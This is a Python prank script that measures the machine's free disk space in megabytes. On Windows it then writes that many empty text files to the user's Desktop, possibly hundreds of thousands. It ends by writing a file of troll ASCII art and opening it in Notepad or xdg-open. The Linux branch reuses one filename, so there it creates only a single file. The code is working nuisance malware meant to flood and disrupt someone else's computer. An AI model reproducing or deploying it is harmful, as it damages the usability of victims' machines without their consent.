import platform #for getting Os for commands of creating folder 
import shutil #used for getting hardrive freespace 
import subprocess #sending commands to terminal 
import os

counter = 0



#creates files
def create_files(folder_path, total_files):
     file_path = os.path.join(folder_path, f"NewFolder{total_files}.txt")

     with open(file_path, 'w') as f:
        pass #create empty file

#signiture file auto open
def Lizardskin(folder_path):
    #define the file path for the last file 
    smiles = os.path.join(folder_path, "Your_Welcome.txt")

    #create the last file with specific content
    with open(smiles,'w') as f:
        f.write("""     



⠀⢀⣀⣤⡶⠟⠛⠛⠷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⡟⠉⢀⡀⠀⢀⣤⣶⣬⠻⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠻⣷⢦⣀⠀⠀⠘⠿⡿⠿⢦⡄⠙⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⣶⣶⣶⣦⣤⣤⣤⣤⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⢧⡈⠳⣄⠀⠀⠀⠀⠀⠙⠷⣄⠘⣷⡄⠀⠀⠀⠀⠀⣤⠶⣛⣯⣿⠿⠛⠋⠉⠁⢀⣠⠤⠒⠋⠉⠁⠀⠀⠀⠈⠉⠉⠉⠙⠛⠛⠶⢶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢻⣦⠈⠓⢤⣀⠀⠀⠰⣶⣯⠙⠾⣿⣦⣀⣠⣤⠴⠿⠛⠉⠁⠀⢀⣀⡤⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⠶⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⣷⡀⠀⠈⠙⠲⠶⣽⡅⠀⢀⣈⣃⣭⡉⠓⠒⠒⠒⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢶⣤⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢶⣤⣀⡀⢀⣤⣇⣀⣩⣿⣹⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡅⠀⠙⢿⡉⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣾⣿⣾⣿⣿⣿⣿⢣⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠸⡟⠉⠉⠀⠀⠀⠀⠈⠉⠉⠙⠛⠳⢶⣤⣀⠀⠀⠀⠀⠘⣷⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠙⣿⡿⠿⢿⠋⠁⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠷⣄⠀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣦⡄⠀⠀⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠈⠉⡟⢧⣴⠋⡥⠒⠒⠲⣄⠙⠿⢶⢴⣶⣤⣤⣀⣀⣀⣀⣀⣤⡾⢋⡾⠃⠀⠈⢧⡄⢀⣿⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⢀⠇⢸
⠀⠀⠀⠀⠀⠀⠀⢰⠏⠀⠀⣸⠇⠀⠉⠛⠳⢤⣀⠀⠈⠳⣤⡀⠀⠀⠀⠉⠉⠉⠉⠉⠉⣩⣴⠟⠁⠀⠀⠀⡾⢻⡟⠉⠶⣾⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣧⠋⢠⡿
⠀⠀⠀⣀⣠⣤⣀⡟⠀⠀⣼⠋⠀⠀⠀⠀⠀⠀⠙⢷⡄⠀⠈⠻⣷⠿⠶⠦⣤⣤⣤⡶⠞⠋⠁⠀⠀⠀⠀⠀⠻⣬⣿⣦⡻⣦⣝⣷⡄⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠋⢀⣴⠟⠁
⠀⠀⣾⣿⣯⣭⡿⠃⠀⢘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⣀⣀⡘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠛⣿⡟⣿⡏⢻⣿⠀⢀⣠⣤⡶⠶⠛⠋⣉⣠⡴⠞⠛⠁⠀⠀
⠀⢠⣧⢾⣶⡚⣚⣀⣠⣟⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠁⠘⠃⢀⣵⣾⣿⣭⠴⠶⠒⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠃⣿⠟⠉⠉⢹⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⠿⢾⣇⡀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣾⣿⠖⠒⢃⣥⠐⢚⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣵⠛⠉⡿⣯⡵⠶⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⣿⡏⠀⠀⢙⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀



************ For the old day's we do a little trollin 
                


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣯⣥⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣾⡿⠛⠻⣿⣧⠀⣴⡿⠛⢿⣷⠘⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠸⣿⣇⠀⠀⣿⣿⠇⢿⣷⣀⣼⣿⠃⢹⣿⠆⠀⠀⣀⠀⠀⠀⠀⠀⠀⠈⠉⠒⠢⣄⠀⠀⠀⠀⠀⢀⣠⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠻⢿⣷⣿⠿⠋⠀⠈⠉⠋⠉⠁⣀⠤⠔⠒⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠀⢠⣾⠋⢹⡷⠀⠀⠀⠀⢀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⢸⣿⣤⣾⢣⡿⢻⣦⣴⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢇⠀⠀⠉⠉⠁⢻⣧⡾⢣⣿⠉⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⢸⣿⡆⠀⠀⠀⠀⠹⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⡀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⣿⣿⠆⠀⠀
⠀⠀⠀⠀⣀⢀⡀⠀⠀⠀⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡃⠀⠀⣴⠶⣾⡙⣷⡄⠀
⠀⠀⠀⠀⢿⣿⣷⣤⣤⡀⠸⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⢿⣦⡻⣦⣼⠇⠀⠀⠀
⠀⠀⠀⠀⠀⣙⣯⣉⠙⠁⠀⢻⠙⢿⣦⣄⡀⠀⠀⣠⣴⣿⠟⠁⠀⠀⠀⠐⢄⣀⣀⡤⠞⠋⢀⢿⣧⣀⣽⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡟⠙⢻⡇⠀⠀⠀⢧⠀⠈⠛⠻⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠚⠀⠉⠛⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⠿⠿⠁⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣾⠿⢿⣶⡄⠀⠀⠀⠀⠀⠀⠈⠲⠤⣀⣀⣀⣀⣀⣀⣀⡀⠤⠴⠒⠋⠁⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣇⡀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠻⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠷⠿⠋⣴⠟⢻⣆⣀⣴⣦⠄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⢿⣿⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣦⡿⢃⣿⠿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠶⣶⡀⣿⡉⣻⡆⢻⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣧⣀⣽⡇⠙⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                

************Best regards BigWobbyly



""")

        #auto open the file 
        subprocess.run([notepade,smiles])



OS = platform.system() #gets the operating system 


def get_free_space(path='/'):
    #gets free space in bytes for the given path 
    total,used,free = shutil.disk_usage(path)
    mb = free / (1024 **2)
    return mb

free = int(get_free_space())

if OS == "Windows" or OS == "windows":
    folder_path = os.path.join(os.path.expanduser("~"), "Desktop")
    notepade = "notepad"
    for i in range(free - 1):
        create_files(folder_path,counter)
        counter += 1
    Lizardskin(folder_path)
elif OS == "Linux" or OS=="linux":
    folder_path = os.path.join(os.path.expanduser("~"), "Desktop")
    notepade = "xdg-open"
    for i in range(free - 1):
        create_files(folder_path,free)
        counter += 1
    Lizardskin(folder_path)




